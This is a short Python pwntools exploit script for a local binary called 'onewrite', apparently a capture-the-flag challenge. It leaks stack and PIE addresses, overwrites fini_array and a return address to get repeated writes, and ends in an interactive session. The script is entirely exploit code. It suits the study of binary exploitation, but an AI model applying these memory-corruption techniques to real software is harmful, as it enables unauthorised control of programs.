from pwn import *

target = process("./onewrite")
elf = ELF('onewrite')

target.recvuntil("> ")
target.sendline("1")

leak_stack = int(target.recvline().strip(), 16)

target.recvuntil("address :")
data = (str(leak_stack + 0x11).strip())
target.send(data)
target.recvuntil("data :")
target.send(b"\x04"*8)
target.sendline("2")
target.recvuntil(">")

leak_pie = int(target.recvline().strip(), 16)
prog_base = leak_pie - elf.symbols["do_leak"]

fini_array = prog_base + elf.symbols['__do_global_dtors_aux_fini_array_entry']
csu_fini_ret = leak_stack - 72
write = prog_base + elf.symbols["do_overwrite"]
csu_fini = prog_base + elf.symbols["__libc_csu_fini"]

target.send(str(fini_array + 8))
target.send(p64(write))

target.recvuntil("address :")
target.send(str(fini_array))
target.recvuntil("data :")
target.send(p64(write))
target.recvuntil("address :")
target.send(str(csu_fini_ret))
target.recvuntil("data :")
target.send(p64(csu_fini))

target.interactive()
